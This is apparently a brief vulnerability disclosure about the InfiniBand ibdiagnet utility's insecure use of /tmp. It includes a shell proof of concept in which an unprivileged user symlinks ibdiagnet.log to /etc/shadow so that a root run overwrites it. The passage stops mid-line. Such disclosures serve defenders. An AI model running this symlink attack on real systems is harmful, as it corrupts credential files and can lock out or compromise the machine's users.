Description: The infiniband diagnostic utility.
Vulnerability:
The infiniband diagnostic utiltiy handles files in /tmp insecurely. A malicious
user can clobber root owned files with common symlink attacks. http://
www.openfabrics.org/downloads/ibutils/ [nobody@exdb01 tmp]$ ln -s /etc/shadow
ibdiagnet.log [nobody@exdb01 tmp]$ ls -l ibdiagnet.log lrwxrwxrwx 1 nobody
users 11 Mar 6 18:19 ibdiagnet.log -> /etc/shadow [nobody@exdb01 tmp]$ The
following files are created, I imagine anyone of them can be used. [root@exdb01
